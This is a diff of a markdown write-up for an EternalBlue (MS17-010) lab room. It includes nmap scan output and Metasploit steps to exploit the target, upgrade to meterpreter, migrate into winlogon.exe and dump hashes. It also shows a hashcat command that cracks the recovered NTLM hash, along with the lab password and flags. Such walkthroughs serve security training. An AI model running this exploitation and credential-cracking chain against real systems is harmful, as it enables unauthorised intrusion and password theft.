@@ -1,12 +1,8 @@
 # ETERNAL BLUE EXPLOIT
 
-#####
+Scan with nmap
 
-#####
-
-<p>Scan with nmap <p>
-<p>
-	/// nmap output
+```
 	Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-21 20:13 GMT
 Nmap scan report for 10.10.242.168
 Host is up (0.038s latency).
@@ -49,11 +45,11 @@ Host script results:
 Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
 Nmap done: 1 IP address (1 host up) scanned in 128.70 seconds </p>
 
-#####
+```
 
 Re run nmap with --script vuln to find vulnerablities
 
-
+```
 #####Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-21 20:18 GMT
 Nmap scan report for 10.10.242.168
 Host is up (0.038s latency).
@@ -123,54 +119,39 @@ Host script results:
 |_      https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
 
 Nmap done: 1 IP address (1 host up) scanned in 97.85 seconds
+```
 
-#####
+System is vulnerable to MS17-010 (EternalBlue) - some other vulnerablities were found but as this room relates to eternal blue this is obviously the right one.
 
-Is vulnerable to MS17-010 (EternalBlue) - some other vulnerablities were found but as this room relates to eternal blue this is obviously the right one.
+Logging into a remote Kali Machine was required, for some reason I could not get reverse handler to work properly on Ubuntu
 
-#####
+**Metasploit Exploit Steps**
 
-#####
+    Search ms17-010
+    Use /windows/smb/ms10_010_eternalblue
+    set RHOSTS - target IP
+    exploit
+    I'm in
 
-Logging into a remote Kali Machine was required, for some reason i could not get reverse handler to work properly on Ubuntu
+**Privesc**
 
-Search ms17-010
+    use shell\_to\_meterpreter
+    set sessions to be the session that we are using
+    ps to list processes
+    migrate to another process. Apparently winlogon.exe seems to be pretty stable on Windows so I'll use that
 
-Use /windows/smb/ms10_010_eternalblue
+**Obtaining Jons password**
 
-set RHOSTS - target
+    hashdump
+    JONS password = Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
+**Cracking Jons password using hashcat**
 
-exploit
-
-I'm in
-
-#####
-
-#####
-
-use shell_to_meterpreter
-
-set sessions to be the session that we are using
-
-ps to list processes
-
-migrate to another process. Apparently winlogon.exe seems to be pretty stable on Windows so I'll use that
-
-#####
-
-hashdump
-
-JONS password = Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
-
-Cracking Jons password using hashcat
-
-'''
+```
 hashcat -a0 -m1000 ffb43f0de35be4d9917ac0cc8ad57f8d /home/gabriel/Documents/rockyou.txt
-'''
+```
+    Jons password alqfna22
 
-Jons password alqfna22
-#####
-
+**Find Flags**
 Flag1 = flag{access_the_machine} located at the C drive
 
 Flag2 = flag{sam_database_elevated_access} located where windows stores passwords /windows/system32/config
